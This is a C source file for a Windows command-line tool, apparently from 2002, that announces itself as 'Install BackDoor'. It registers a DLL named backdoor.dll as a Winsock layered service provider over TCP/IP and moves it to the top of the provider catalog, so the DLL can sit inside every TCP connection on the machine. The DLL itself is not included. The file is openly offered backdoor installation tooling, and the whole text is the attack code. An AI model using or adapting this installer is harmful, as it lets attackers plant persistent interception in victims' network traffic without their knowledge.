#define  UNICODE
#define  _UNICODE

#include <stdio.h>
#include <tchar.h>
#include <string.h>
#include <ws2spi.h>
#include <sporder.h>

                           
GUID  filterguid={0xc5fabbd0,0x9736,0x11d1,{0x93,0x7f,0x00,0xc0,0x4f,0xad,0x86,0x0d}};

GUID  filterchainguid={0xf9065320,0x9e90,0x11d1,{0x93,0x81,0x00,0xc0,0x4f,0xad,0x86,0x0d}};

BOOL  getfilter();
void  freefilter();
void  installfilter();
void  removefilter();
void  start();
void  usage();

int                   totalprotos=0;
DWORD                 protoinfosize=0;
LPWSAPROTOCOL_INFOW   protoinfo=NULL;

int main(int argc,char *argv[])
{
	start();

	if(argc==2)
	{
		if(!strcmp(argv[1],"-install"))
		{
			installfilter();
			return 0;
		}
		else if(!strcmp(argv[1],"-remove"))
		{
			removefilter();
			return 0;
		}
	}
	usage();
	return 0;
}

BOOL getfilter()
{
	int  errorcode;

	protoinfo=NULL;
	totalprotos=0;
	protoinfosize=0;

	if(WSCEnumProtocols(NULL,protoinfo,&protoinfosize,&errorcode)==SOCKET_ERROR)
	{
		if(errorcode!=WSAENOBUFS)
		{
			printf("First WSCEnumProtocols Error: %d\n",errorcode);
			return FALSE;
		}
	}

	if((protoinfo=(LPWSAPROTOCOL_INFOW)GlobalAlloc(GPTR,protoinfosize))==NULL)
	{
		printf("GlobalAlloc in getfilter Error: %d\n",GetLastError());
		return FALSE;
	}

	if((totalprotos=WSCEnumProtocols(NULL,protoinfo,&protoinfosize,&errorcode))==SOCKET_ERROR)
	{
		printf("Second WSCEnumProtocols Error: %d\n",GetLastError());
		return FALSE;
	}

	printf("Found %d protocols!\n",totalprotos); 
	return TRUE;
}

void freefilter()
{
	GlobalFree(protoinfo);
}

void installfilter()
{
	int                i;
	int                provcnt;
	int                cataindex;
	int                errorcode;
	BOOL               rawip=FALSE;
	BOOL               tcpip=FALSE;
	DWORD              iplayercataid=0,tcporigcataid; 
	TCHAR              filter_path[MAX_PATH];            
	TCHAR              filter_name[MAX_PATH];
	TCHAR              chainname[WSAPROTOCOL_LEN+1];      
	LPDWORD            cataentries;
	WSAPROTOCOL_INFOW  iplayerinfo,tcpchaininfo,chainarray[1];

	getfilter();
    
	for(i=0;i<totalprotos;i++)
	{
		if(!rawip
		   && protoinfo[i].iAddressFamily==AF_INET
		   && protoinfo[i].iProtocol==IPPROTO_IP)
		{
			rawip=TRUE;
			memcpy(&iplayerinfo,&protoinfo[i],sizeof(WSAPROTOCOL_INFOW));
			iplayerinfo.dwServiceFlags1=protoinfo[i].dwServiceFlags1 & (~XP1_IFS_HANDLES);
		}

		if(!tcpip
		   && protoinfo[i].iAddressFamily==AF_INET
		   && protoinfo[i].iProtocol==IPPROTO_TCP)  
		{
			tcpip=TRUE;
			tcporigcataid=protoinfo[i].dwCatalogEntryId;
			memcpy(&tcpchaininfo,&protoinfo[i],sizeof(WSAPROTOCOL_INFOW));
			tcpchaininfo.dwServiceFlags1=protoinfo[i].dwServiceFlags1 & (~XP1_IFS_HANDLES);
		}
	}

	_tcscpy(iplayerinfo.szProtocol,_TEXT("IP FILTER"));
	iplayerinfo.ProtocolChain.ChainLen=LAYERED_PROTOCOL;

	
	if(GetCurrentDirectory(MAX_PATH,filter_path)==0)
	{
		printf("GetCurrentDirectory Error: %d\n",GetLastError());
		return ;
	}
	_tcscpy(filter_name,_TEXT("\\backdoor.dll")); 
	_tcscat(filter_path,filter_name);

	if(WSCInstallProvider(&filterguid,filter_path,&iplayerinfo,1,&errorcode)==SOCKET_ERROR)
	{
		printf("WSCInstallProvider Error: %d\n",errorcode);
		return ;
	}

	freefilter();

	getfilter();

	for(i=0;i<totalprotos;i++)
	{
		if(memcmp(&protoinfo[i].ProviderId,&filterguid,sizeof(GUID))==0)
		{
			iplayercataid=protoinfo[i].dwCatalogEntryId;
			break;
		}
	}

    provcnt=0;
	if(tcpip)
	{
		swprintf(chainname,_TEXT("TCP FILTER"));
		_tcscpy(tcpchaininfo.szProtocol,chainname);
		if(tcpchaininfo.ProtocolChain.ChainLen==BASE_PROTOCOL)
		{
			tcpchaininfo.ProtocolChain.ChainEntries[1]=tcporigcataid;
		}
		else
		{
			for(i=tcpchaininfo.ProtocolChain.ChainLen;i>0;i--)
			{
				tcpchaininfo.ProtocolChain.ChainEntries[i+1]=tcpchaininfo.ProtocolChain.ChainEntries[i];
			}
		}

		tcpchaininfo.ProtocolChain.ChainLen++;
		tcpchaininfo.ProtocolChain.ChainEntries[0]=iplayercataid;

		memcpy(&chainarray[provcnt++],&tcpchaininfo,sizeof(WSAPROTOCOL_INFOW));
	}

	if(WSCInstallProvider(&filterchainguid,filter_path,chainarray,provcnt,&errorcode)==SOCKET_ERROR)
	{
		printf("WSCInstallProvider for chain Error: %d\n",errorcode);
		return ;
	}

	freefilter();

	getfilter();

	if((cataentries=(LPDWORD)GlobalAlloc(GPTR,totalprotos*sizeof(WSAPROTOCOL_INFOW)))==NULL)
	{
		printf("GlobalAlloc int installfilter Error: %d\n",errorcode);
		return ;
	}

	cataindex=0;
	for(i=0;i<totalprotos;i++)
	{
		if(memcmp(&protoinfo[i].ProviderId,&filterguid,sizeof(GUID))==0
		  || memcmp(&protoinfo[i].ProviderId,&filterchainguid,sizeof(GUID))==0)
		{
			cataentries[cataindex++]=protoinfo[i].dwCatalogEntryId;
		}
	}

	for(i=0;i<totalprotos;i++)
	{
		if(memcmp(&protoinfo[i].ProviderId,&filterguid,sizeof(GUID))!=0
		  && memcmp(&protoinfo[i].ProviderId,&filterchainguid,sizeof(GUID))!=0)
		{
			cataentries[cataindex++]=protoinfo[i].dwCatalogEntryId;
		}
	}

	if((errorcode==WSCWriteProviderOrder(cataentries,totalprotos))!=ERROR_SUCCESS)
	{
		printf("WSCWriteProviderOrder Error: %d\n",GetLastError());
		return ;
	}

	freefilter();
}

void removefilter()
{
	int  errorcode;

	if(WSCDeinstallProvider(&filterguid,&errorcode)==SOCKET_ERROR)
	{
		printf("WSCDeinstall filterguid Error: %d\n",errorcode);
	}

	if(WSCDeinstallProvider(&filterchainguid,&errorcode)==SOCKET_ERROR)
	{
		printf("WSCDeinstall filterchainguid Error: %d\n",errorcode);
	}
	return ;
}

void  start()
{
	printf("Install BackDoor, by TOo2y\n"); 
	printf("E-mail: TOo2y@safechina.net\n");
	printf("Homepage: www.safechina.net\n");
	printf("Date: 11-3-2002\n\n");
	return ;
}
void  usage()
{
	printf("instBD  [ -install | -remove]\n");
	return ;
}


			
		
